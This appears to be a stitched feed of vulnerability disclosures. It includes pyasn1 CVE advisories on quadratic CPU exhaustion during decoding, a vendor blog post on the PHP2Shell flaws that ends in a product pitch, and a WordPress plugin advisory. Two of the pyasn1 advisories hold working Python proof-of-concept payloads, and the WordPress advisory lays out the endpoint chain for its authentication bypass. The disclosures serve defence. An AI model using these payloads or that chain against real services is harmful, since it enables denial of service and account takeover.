🟠 CVE-2026-119197 - High (7.5)

pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, binary REAL decoding builds a large mantissa one octet at a time by shifting a growing integer and slicing the remaining byte string. Attacker-controlled ASN.1 includes a binary-encoded...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-119197/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-119197.description:
## Summary

In pyasn1 0.6.4 and earlier, decoding a binary-encoded ASN.1 REAL with a large mantissa can consume CPU time quadratic in the mantissa length. The BER, CER, and DER decoders all use the affected `RealPayloadDecoder`. An application is exposed when it passes attacker-controlled ASN.1 containing a REAL value to one of these decoders, either without an `asn1Spec` or with a schema that includes REAL. The work occurs inside `decode()`; the application does not need to convert, print, or otherwise use the resulting REAL object.

This is distinct from [CVE-2026-59886](https://github.com/advisories/GHSA-hm4w-wwcw-mr6r), which concerns converting an already-decoded REAL to a Python float. That issue was fixed in 0.6.4 and its advisory states that decoding alone does not trigger it.

## Root cause and affected components

For binary REAL values, [`RealPayloadDecoder.valueDecoder` in v0.6.4](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L535-L603) builds the mantissa one octet at a time:

```python
p = 0
while chunk:
    p <<= 8
    p |= chunk[0]
    chunk = chunk[1:]
```

Each shift processes an integer that grows with the mantissa; with byte strings, each slice also copies the remaining suffix. Repeating both operations for every octet makes decoding quadratic in mantissa size. The decoder's [eight-octet length-field limit](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1704-L1717) does not impose a practical mantissa-size limit for the inputs demonstrated below. [CER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/cer/decoder.py#L51-L62) and [DER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L23-L31) reuse the BER REAL payload decoder, so all three paths reach this loop.

The vulnerable loop is present in every available repository release tag inspected, from v0.2.1 through v0.6.4. Runtime measurements below were made on v0.6.4; older releases were checked for the loop, not benchmarked individually.

## Impact

A comparatively small REAL value can hold a decoder worker on one CPU core for seconds or longer. The attacker must be able to supply data that the application sends to an affected decoder, and application-level input limits may reduce exposure. The demonstrated effect is CPU exhaustion during decoding; this advisory does not assert a network endpoint, unauthenticated access, or an affected downstream application by itself.

## Reproduction and evidence

The following example uses pyasn1 0.6.4. The `0x09` tag identifies REAL; `0x80 0x00` selects a positive, base-2 binary value with a one-octet zero exponent, followed by a large mantissa. It exercises `decode()` only.

```python
import time

from pyasn1.codec.ber import decoder as ber
from pyasn1.codec.cer import decoder as cer
from pyasn1.codec.der import decoder as der


def real_value(mantissa_octets):
    content = b"\x80\x00" + b"\xff" * mantissa_octets
    length = len(content).to_bytes(3, "big")
    return b"\x09\x83" + length + content


for codec in (ber, cer, der):
    for size in (50_000, 100_000, 200_000):
        substrate = real_value(size)
        started = time.process_time()
        value, rest = codec.decode(substrate)
        print(codec.__name__, size, time.process_time() - started)
        assert not rest
        assert tuple(value)[1:] == (2, 0)
```

The original report measured the following BER CPU times on repository commit `aa05757`. That commit is later than the official v0.6.4 tag; the vulnerable loop is identical in the tagged release.

| Mantissa size | Reporter's BER CPU time |
| ---: | ---: |
| 50,000 octets | 0.328 s |
| 100,000 octets | 1.299 s |
| 200,000 octets | 6.043 s |
| 400,000 octets | 24.095 s |

The same report measured 5.645 s for a 200,000-octet mantissa through DER.

A separate local reproduction on the official v0.6.4 tag (`d43496f`, CPython 3.14.8, macOS arm64) measured BER at 0.209 s, 0.884 s, and 3.451 s for 50,000, 100,000, and 200,000 mantissa octets respectively. CER and DER each took about 0.89 s at 100,000 octets. These are machine-specific measurements; the repeated near-fourfold cost for doubled input is the relevant result. Neither reproduction calls `float()`, `str()`, or `prettyPrint()`.

## Fix

pyasn1 0.6.5 replaces the per-octet shift and slice loop with one `int.from_bytes(bytes(chunk), "big")` conversion. Sign, scale, exponent, and the decoded REAL tuple are preserved. The fix is in the shared BER payload decoder and therefore covers BER, CER, and DER. A local check of the 0.6.5 candidate decoded a 200,000-octet mantissa correctly through all three codecs; the check does not establish behavior for every application using REAL.

## Workarounds

Upgrade to pyasn1 0.6.5. Until then, reject or strictly limit attacker-controlled ASN.1 input that may contain REAL values before passing it to pyasn1. The appropriate size limit depends on the application's available CPU time and request volume.

CVE-2026-119196.description: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, constructed BIT STRING decoding repeatedly shifts and copies the complete bit value accumulated from earlier fragments. Attacker-controlled BER or CER input contains many constructed BIT STRING fragments; schema-driven DER also accepts a definite-length constructed BIT STRING. BitStringPayloadDecoder repeatedly calls BitString.fromOctetString with the prior bitString as prepend, shifting an ever-growing SizedInteger for each fragment and causing quadratic work. Large fragmented values can exhaust CPU during decode() without requiring later conversion or formatting. This issue is fixed in version 0.6.5.

pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, constructed string and indefinite-length ANY decoding repeatedly concatenates each fragment onto a growing bytes value. Attacker-controlled BER or CER data can use many constructed OCTE...

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-119195.description: pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, constructed string and indefinite-length ANY decoding repeatedly concatenates each fragment onto a growing bytes value. Attacker-controlled BER or CER data can use many constructed OCTET STRING or character-string fragments. DER rejects constructed OCTET STRING without a schema, but accepts its definite-length form when asn1Spec selects univ.OctetString; it also accepts constructed character strings such as UTF8String without a schema, even though those encodings are not valid DER. The separate indefinite-length ANY path is reachable in BER and CER when asn1Spec selects univ.Any; DER rejects indefinite lengths. OctetStringPayloadDecoder uses growing header concatenation and AnyPayloadDecoder.indefLenValueDecoder uses growing chunk concatenation, repeatedly copying an increasing prefix and causing quadratic work. A sufficiently fragmented value can occupy decoding workers and cause CPU exhaustion without confidentiality or integrity impact. This issue is fixed in version 0.6.5.

🟠 CVE-2026-119194 - High (7.5)

pyasn1 is a generic ASN.1 library for Python. From 0.3.3 until 0.6.5, schemaless container decoding stores every decoded component's TagSet in a growing set even though only one-versus-multiple tag types must be distinguished. Attacker-controlled ...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-119194/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-119194.description:
### Summary

When an application decodes attacker-controlled BER, CER, or DER data without an ASN.1 schema, a container with many distinct long tag IDs can cause quadratic CPU use. Repeated inputs can exhaust CPU and reduce service availability.

### Details

ConstructedPayloadDecoderBase._decodeComponentsSchemaless inserts every decoded component’s TagSet into a growing set, although it only needs to distinguish one tag set from two or more. Attacker-chosen tag IDs can have colliding TagSet hashes, making each later insertion compare against an increasing number of earlier tags. This path is present in v0.6.4 and is inherited by the CER and DER decoders. The proposed fix stops growing the classification set after it contains two distinct tag sets, while retaining every decoded component and its order.  On v0.6.4 with CPython 3.12.10, increasing the collision input from 3,200 to 6,400 components raised decode CPU time from 0.438 to 1.747 seconds; a comparable control rose from 0.031 to 0.065 seconds. Both inputs decoded successfully with the expected values and an empty remainder.

### Proof of concept

Run this outside the repository checkout in a fresh Python 3.12 environment with pyasn1==0.6.4 installed:

```python
import sys
import time

from pyasn1.codec.ber import decoder
from pyasn1.type import univ


def enc_tag(tag_id):
    groups = [tag_id & 0x7f]
    tag_id >>= 7
    while tag_id:
        groups.append((tag_id & 0x7f) | 0x80)
        tag_id >>= 7
    return b'\xbf' + bytes(reversed(groups))


def payload(tag_ids):
    body = b''.join(enc_tag(tag_id) + b'\x03\x04\x01A'
                    for tag_id in tag_ids)
    length = len(body).to_bytes((len(body).bit_length() + 7) // 8, 'big')
    return b'\x30' + bytes([0x80 | len(length)]) + length + body


for count in (3200, 6400):
    cases = (
        ("collision", [32 + i * sys.hash_info.modulus
                       for i in range(count)]),
        ("control", [(1 << 70) + i for i in range(count)]),
    )
    for name, tag_ids in cases:
        wire = payload(tag_ids)
        start = time.process_time()
        value, remainder = decoder.decode(wire)
        cpu_seconds = time.process_time() - start

        assert type(value) is univ.Sequence
        assert len(value) == count and remainder == b''
        for position, tag_id in enumerate(tag_ids):
            component = value.getComponentByPosition(position)
            assert component.asOctets() == b'A'
            assert component.tagSet[-1].tagId == tag_id

        print(count, name, len(wire), round(cpu_seconds, 3))
```

### Impact

Applications that pass attacker-controlled bytes to schemaless BER, CER, or DER decoding can spend disproportionate CPU time on a relatively small, valid input. The demonstrated impact is availability; no confidentiality or integrity impact was observed.

posts.content:
PHP2Shell: One Vulnerable PHP Server Can Become Your Next Major Security Incident

The vulnerability is in PHP. The real failure may be in your IT operations.

On October 21, 2026, security researchers disclosed two critical vulnerabilities in PHP that can allow an unauthenticated attacker to execute code remotely. Within days, exploitation reports emerged, and CISA added both vulnerabilities to its Known Exploited Vulnerabilities catalog.

The vulnerabilities, tracked as CVE-2026-109618 and CVE-2026-109619, are collectively known as PHP2Shell. Both received a CVSS 4.0 severity score of 9.2. PHP is widely deployed, making the potential attack surface enormous.

This isn’t a theoretical risk to put on next quarter’s security roadmap.
It’s an operational problem that needs attention now.

Why PHP2Shell is different

Most people hear about a vulnerability and immediately ask: Which application is affected?

PHP2Shell changes the conversation because the flaw sits in the PHP runtime itself, below application-level defenses.

The vulnerabilities involve memory-management errors that can leave PHP in an unsafe state when handling requests. Under the right conditions, an attacker can exploit that behavior to execute arbitrary code or expose sensitive process memory.

An attacker doesn’t necessarily need a valid account or a compromised employee laptop. A vulnerable, internet-facing PHP service may be enough.

And the implications go beyond the web application itself. Successful remote code execution can give an attacker a foothold to steal credentials, access sensitive files, establish persistence, or move toward other systems.

The critical detail: an application-level security check cannot reliably protect against a vulnerability that can be triggered before application code runs.

That is why PHP2Shell requires infrastructure-level remediation, not simply a code change in your application.

The uncomfortable question: Do you know where you’re running PHP?

PHP is not limited to the application your engineering team actively maintains.

It may be running in a WordPress installation, a legacy internal tool, a customer portal, a third-party application, a container, or a server that nobody remembers deploying.

The affected environments include PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed. The PHP team has identified Apache mod_php as particularly concerning.

For a 50- or 200-person company without a large security team, the difficult part may not be understanding the vulnerability. It may be answering five basic questions:

  • Which internet-facing systems run PHP?
  • Which versions are installed, including bundled and containerized versions?
  • Who owns each system, and who can patch it?
  • Have the vulnerable systems actually been updated and restarted?
  • Has anything suspicious happened since the vulnerability became exploitable?

If those answers require days of Slack messages and spreadsheet archaeology, your company has an operational security gap.

What companies should do now

1. Find every affected PHP installation

Inventory production servers, development environments, containers, hosted applications, and third-party software that bundles PHP.

Don’t rely on the engineering team’s memory or a list of approved assets. Verify the running versions and configurations.

2. Patch to a fixed release

The PHP security releases addressing the two PHP2Shell vulnerabilities are:

  • PHP 8.5.12 or later
  • PHP 8.4.27 or later
  • PHP 8.3.36 or later
  • PHP 8.2.35 or later

These are the minimum fixed releases for the respective branches; use the latest supported security release available. PHP 8.1 and older branches are end-of-life and require migration to a supported version.

Verify the actual runtime, deploy the appropriate update, restart affected services where necessary, and confirm that the fix is active. Updating a development dependency doesn’t patch a production server. If you cannot patch immediately, restrict exposure and apply the PHP team’s recommended temporary mitigations. Disabling session upload-progress tracking can reduce risk, but it is not a substitute for installing the security update.

Important: A separate PHP issue, CVE-2026-115560, was disclosed shortly afterward. It involves a specific combination of session configuration and application behavior and is not fixed by the PHP2Shell releases above. Check the latest PHP security advisories rather than assuming one update resolves every newly disclosed PHP vulnerability.

3. Look for signs of compromise

Patching closes the known vulnerability. It does not prove that nobody exploited it before the update.
Review web-server, application, authentication, and endpoint telemetry for suspicious activity. Pay particular attention to unexpected child processes launched by PHP workers, unfamiliar files, new accounts, unusual outbound connections, and unexplained changes to services.

Don’t rely exclusively on matching a known malicious request. Exploitation can be difficult to identify from application logs alone, especially when the vulnerable behavior occurs before application code executes. If you find evidence of compromise, treat it as an incident: investigate the host, contain the threat, assess credential exposure, and follow an appropriate recovery process.

4. Turn the response into a repeatable process

PHP2Shell is one example of a recurring problem: a critical vulnerability is disclosed, and every organization must quickly discover its exposure, assign ownership, remediate affected systems, and document the outcome.
The companies that handle this well aren’t necessarily the ones with the largest security budgets. They are the ones that can answer those questions quickly and consistently.

Where EspressoLabs fits

EspressoLabs is building an AI-native IT, security, and compliance platform for small and midsize businesses. The goal is to make security operations more accessible without requiring every company to assemble an enterprise-sized IT and security team.

An incident like PHP2Shell illustrates why that matters.

1. Better visibility into your environment.
You cannot protect an asset you don’t know exists. An effective IT operations process starts with discovering systems, understanding their software and configuration, and identifying who owns them.

2. Faster remediation and verification.
Security teams need more than a vulnerability alert. They need a clear path from identifying an affected system to assigning remediation, tracking progress, and verifying that the change was completed. EspressoLabs can help streamline the IT operations and follow-through around that process.

3. Security that doesn’t stop at the endpoint.
Endpoint protection is important, but it cannot replace patching a vulnerable server-side runtime. Companies need complementary controls across infrastructure, identity, endpoint security, and application operations.

4. Evidence that security work actually happened.
For companies preparing for SOC 2 or maintaining an existing program, asset inventories, remediation records, assigned ownership, and documented follow-up can support a stronger vulnerability-management process. Those records do not, by themselves, establish SOC 2 compliance; controls must also be appropriately designed, implemented, and tested.

One important distinction: an IT management platform does not automatically patch every PHP installation, detect every exploit, or replace specialist incident response. Coverage depends on the systems integrated, permissions granted, and controls deployed. Internet-facing applications and runtimes still need explicit assessment and remediation.

The broader objective is to make these tasks part of routine operations rather than a fire drill every time a critical CVE hits the news.

The CTO’s PHP2Shell checklist

If I were responsible for technology at a 100-person company today, this would be my immediate checklist:

  • Inventory all PHP runtimes and internet-facing applications.
  • Identify affected versions, including bundled and containerized installations.
  • Assign an owner and deadline to every affected asset.
  • Patch to a fixed, supported PHP release and verify the running version.
  • Review exposure during the pre-patch window for signs of compromise.
  • Investigate suspicious processes, files, credentials, and outbound traffic.
  • Review the latest PHP advisories for additional vulnerabilities, including CVE-2026-115560.
  • Document remediation and improve the process for the next critical vulnerability.

The bottom line

PHP2Shell is a reminder that security isn’t just about buying the right tools. It’s about knowing what you operate, understanding where you’re exposed, and being able to act before a vulnerability becomes a breach.
If your team needs a spreadsheet, three meetings, and a week of investigation to discover which systems are affected by a critical vulnerability, the problem is bigger than PHP.

You need a better way to run IT and security.

EspressoLabs helps SMBs build a more manageable approach to IT, security, and compliance, without the cost and complexity of traditional enterprise operations.
If you’re also working toward SOC 2, explore our EspressoLabs SOC 2 offer to see how we can help make the journey more accessible.

Misc

  • Sources: Wiz Research
  • Canadian Centre for Cyber Security

Disable plugin or block REST endpoints until patched. https://radar.offseq.com/threat/cve-2026-109516-cwe-287-improper-authentication-in-guruteam-bot-for-telegram-on-woocommerce-292ec2d16c9aa743 #OffSeq #WordPress #CVE2026109516

CVE-2026-109516.description: The Bot for Telegram on WooCommerce plugin for WordPress is vulnerable to Authentication Bypass leading to Account Takeover in all versions up to, and including, 1.3.0. The `/wp-json/woo-telegram/v1/main/` REST endpoint is registered with `permission_callback => '__return_true'` and performs no Telegram webhook signature verification, allowing an unauthenticated attacker to POST a forged bot update with a `message.chat.id` set to any WordPress login name; `bftow_get_user_system_id()` resolves this attacker-supplied value to the targeted account via `get_user_by('login', $tgId)` with no ownership proof, and writes a login token computed as `md5($_SERVER['HTTP_USER_AGENT'] . time())` — both inputs are fully attacker-controlled or bounded within seconds using the response's own `Date` header. The resulting token is redeemable at the unauthenticated, capability-check-free, and nonce-less `?action=bftow_create_order&bftow_token=` endpoint, which calls `wp_set_auth_cookie()` unconditionally via `login_user_by_id`, issuing a persistent authenticated session cookie for the targeted account to the attacker. This makes it possible for unauthenticated attackers to log in as any WordPress user, including administrators, given only that user's username.
